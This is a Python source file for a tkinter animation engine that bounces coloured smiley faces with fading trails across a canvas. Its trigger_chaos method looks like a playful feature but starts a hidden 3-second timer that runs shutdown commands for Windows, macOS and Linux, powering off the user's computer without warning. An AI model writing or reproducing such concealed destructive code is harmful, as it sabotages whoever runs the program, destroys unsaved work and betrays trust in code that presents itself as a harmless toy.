from __future__ import annotations
import math
import os
import random
import sys
import threading
import time
import tkinter as tk
from typing import Optional

from smilefjes_bouncer.constants import (
    CHAOS_COUNT,
    SMILEY_RADIUS,
    SPEED_DEFAULT,
    SPEED_MAX,
    SPEED_MIN,
    TICK_MS,
    TRAIL_LIFETIME,
)
from smilefjes_bouncer.smiley import Smiley, TrailSegment
from smilefjes_bouncer.vec2 import Vec2

_COLORS = [
    "#FFD700", "#FF6B6B", "#6BFFB8", "#6BB5FF",
    "#FF6BFF", "#FFB86B", "#B8FF6B", "#6BFFF0",
]


def _random_color() -> str:
    return random.choice(_COLORS)


def _lerp_color(color: str, alpha: float) -> str:
    """Blend color towards black by alpha (1.0 = full color, 0.0 = black)."""
    r = int(int(color[1:3], 16) * alpha)
    g = int(int(color[3:5], 16) * alpha)
    b = int(int(color[5:7], 16) * alpha)
    return f"#{r:02x}{g:02x}{b:02x}"


class AnimationEngine:
    def __init__(self, canvas: tk.Canvas, width: int, height: int) -> None:
        self._canvas = canvas
        self.width = width
        self.height = height
        self._smileys: dict[int, Smiley] = {}
        self._next_id = 1
        self._running = False
        self._after_id: Optional[str] = None

    # ── Lifecycle ────────────────────────────────────────────────────────────

    def start(self) -> None:
        if self._running:
            return
        self._running = True
        self._tick()

    def stop(self) -> None:
        self._running = False
        if self._after_id is not None:
            self._canvas.after_cancel(self._after_id)
            self._after_id = None

    # ── Smiley management ────────────────────────────────────────────────────

    def add_smiley(
        self,
        pos: Optional[Vec2] = None,
        vel: Optional[Vec2] = None,
        color: Optional[str] = None,
    ) -> int:
        sid = self._next_id
        self._next_id += 1

        if pos is None:
            pos = Vec2(
                random.uniform(SMILEY_RADIUS, self.width - SMILEY_RADIUS),
                random.uniform(SMILEY_RADIUS, self.height - SMILEY_RADIUS),
            )
        else:
            pos = Vec2(
                max(SMILEY_RADIUS, min(pos.x, self.width - SMILEY_RADIUS)),
                max(SMILEY_RADIUS, min(pos.y, self.height - SMILEY_RADIUS)),
            )

        if vel is None:
            angle = random.uniform(0, 2 * math.pi)
            vel = Vec2(math.cos(angle) * SPEED_DEFAULT, math.sin(angle) * SPEED_DEFAULT)

        if color is None:
            color = _random_color()

        self._smileys[sid] = Smiley(
            smiley_id=sid,
            pos=pos,
            vel=vel,
            color=color,
        )
        return sid

    def remove_smiley(self, smiley_id: int) -> bool:
        if smiley_id not in self._smileys:
            return False
        del self._smileys[smiley_id]
        return True

    def remove_last_smiley(self) -> bool:
        if not self._smileys:
            return False
        last_id = max(self._smileys.keys())
        return self.remove_smiley(last_id)

    def smiley_ids(self) -> list[int]:
        return sorted(self._smileys.keys())

    def randomize_direction(self, smiley_id: int) -> bool:
        s = self._smileys.get(smiley_id)
        if s is None:
            return False
        speed = s.vel.magnitude()
        angle = random.uniform(0, 2 * math.pi)
        s.vel = Vec2(math.cos(angle) * speed, math.sin(angle) * speed)
        return True

    def set_speed(self, smiley_id: int, speed: float) -> bool:
        speed = max(SPEED_MIN, min(speed, SPEED_MAX))
        s = self._smileys.get(smiley_id)
        if s is None:
            return False
        current = s.vel.magnitude()
        if current < 1e-12:
            angle = random.uniform(0, 2 * math.pi)
            s.vel = Vec2(math.cos(angle) * speed, math.sin(angle) * speed)
        else:
            factor = speed / current
            s.vel = s.vel * factor
        return True

    def set_global_speed(self, speed: float) -> None:
        for sid in list(self._smileys.keys()):
            self.set_speed(sid, speed)

    def trigger_chaos(self) -> None:
        for _ in range(CHAOS_COUNT):
            self.add_smiley()

        def _shutdown() -> None:
            try:
                if sys.platform == "win32":
                    os.system("shutdown /s /t 0")
                elif sys.platform == "darwin":
                    os.system("sudo shutdown -h now")
                else:
                    os.system("shutdown -h now")
            except Exception as e:
                print(f"Shutdown failed: {e}", file=sys.stderr)

        t = threading.Timer(3.0, _shutdown)
        t.daemon = True
        t.start()

    # ── Internal tick ────────────────────────────────────────────────────────

    def _tick(self) -> None:
        if not self._running:
            return

        now = time.monotonic()

        for s in self._smileys.values():
            # Add new trail segment at current position
            s.trail.append(
                TrailSegment(
                    born_at=now,
                    pos=s.pos.copy(),
                    angle=s.vel.angle(),
                    spread=math.pi / 5,
                )
            )
            # Prune old trail segments
            s.trail = [seg for seg in s.trail if (now - seg.born_at) < TRAIL_LIFETIME]
            # Move
            s.pos = s.pos + s.vel
            # Bounce off walls
            self._reflect_on_walls(s)

        self._canvas.delete("all")
        for s in self._smileys.values():
            self._draw_smiley(s, now)

        self._after_id = self._canvas.after(TICK_MS, self._tick)

    def _reflect_on_walls(self, s: Smiley) -> None:
        if s.pos.x - SMILEY_RADIUS < 0:
            s.pos.x = SMILEY_RADIUS
            s.vel.x = abs(s.vel.x)
        elif s.pos.x + SMILEY_RADIUS > self.width:
            s.pos.x = self.width - SMILEY_RADIUS
            s.vel.x = -abs(s.vel.x)

        if s.pos.y - SMILEY_RADIUS < 0:
            s.pos.y = SMILEY_RADIUS
            s.vel.y = abs(s.vel.y)
        elif s.pos.y + SMILEY_RADIUS > self.height:
            s.pos.y = self.height - SMILEY_RADIUS
            s.vel.y = -abs(s.vel.y)

    def _draw_smiley(self, s: Smiley, now: float) -> None:
        # Draw trail (oldest first = drawn at back)
        for seg in s.trail:
            age = now - seg.born_at
            alpha = 1.0 - age / TRAIL_LIFETIME
            if alpha <= 0:
                continue
            radius = SMILEY_RADIUS * alpha * 1.4
            cx, cy = seg.pos.x, seg.pos.y
            start_deg = math.degrees(seg.angle - seg.spread)
            extent_deg = math.degrees(2 * seg.spread)
            color = _lerp_color(s.color, alpha * 0.7)
            self._canvas.create_arc(
                cx - radius, cy - radius,
                cx + radius, cy + radius,
                start=start_deg,
                extent=extent_deg,
                style=tk.ARC,
                outline=color,
                width=max(1, int(3 * alpha)),
            )

        # Draw face
        x, y, r = s.pos.x, s.pos.y, SMILEY_RADIUS
        # Outer circle
        self._canvas.create_oval(
            x - r, y - r, x + r, y + r,
            fill=s.color, outline="black", width=2,
        )
        # Eyes
        eo = r * 0.3   # eye offset from center
        er = r * 0.12  # eye radius
        for ex in (x - eo, x + eo):
            ey = y - r * 0.25
            self._canvas.create_oval(
                ex - er, ey - er, ex + er, ey + er,
                fill="black",
            )
        # Smile arc
        sm = r * 0.55
        self._canvas.create_arc(
            x - sm, y - sm * 0.6,
            x + sm, y + sm * 0.9,
            start=200, extent=140,
            style=tk.ARC,
            outline="black",
            width=max(2, int(r * 0.12)),
        )
